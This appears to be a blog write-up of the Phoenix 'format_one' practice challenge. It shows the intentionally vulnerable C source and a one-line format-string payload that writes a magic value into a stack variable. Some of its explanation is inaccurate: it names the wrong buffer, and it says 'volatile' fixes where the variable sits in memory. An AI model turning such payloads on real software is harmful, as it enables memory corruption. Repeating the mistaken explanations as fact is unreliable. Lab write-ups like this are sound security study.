---
title: Phoenix - format_one
date: 2026-06-06 00:00:00 +0800
categories: [PWN]
tags:      # TAG names should always be lowercase
description: Phoenix format_one ctf
toc: true
---

## Introduction
I will be explaining how i did the challenge format_one from the series Phoenix found at <https://exploit.education/phoenix/format-one/>

## Step one
Firstly, i inspect the source code, this time i will be exploiting __sprintf__:

```
/*
 * phoenix/format-one, by https://exploit.education
 *
 * Can you change the "changeme" variable?
 *
 * Why did the Tomato blush? It saw the salad dressing!
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char dest[32];
    volatile int changeme;
  } locals;
  char buffer[16];

  printf("%s\n", BANNER);

  if (fgets(buffer, sizeof(buffer) - 1, stdin) == NULL) {
    errx(1, "Unable to get buffer");
  }
  buffer[15] = 0;

  locals.changeme = 0;

  sprintf(locals.dest, buffer);

  if (locals.changeme != 0x45764f6c) {
    printf("Uh oh, 'changeme' is not the magic value, it is 0x%08x\n",
        locals.changeme);
  } else {
    puts("Well done, the 'changeme' variable has been changed correctly!");
  }

  exit(0);
}

```

The function i want to target will be __sprintf__ which takes the input and allocates it inside a buffer. 
## Step two
As __sprintf__ is used, my approach is to overflow `buffer` which will affect the value of `changeme`. Additionally, my payload must contain 32 characters followed by `\x6c\x4f\x76\x45` as that is the magic value. This causes only the magic flow to overflow into `changeme`. To do this, run the following command inside the folder containing the binary. 

```
python -c 'print("%32x" + "\x6c\x4f\x76\x45")' | ./format_one.elf
```

This causes __sprintf__ to load 32 empty values into `buffer` followed by an overflow containing the magic value. As __volatile__ was used, `changme` will be located right after `buffer`. This causes the magic value to overflow into `changme` , thus completing the challenge.

![](assets/posts/PWN/phoenix_stack_one/flag.png)




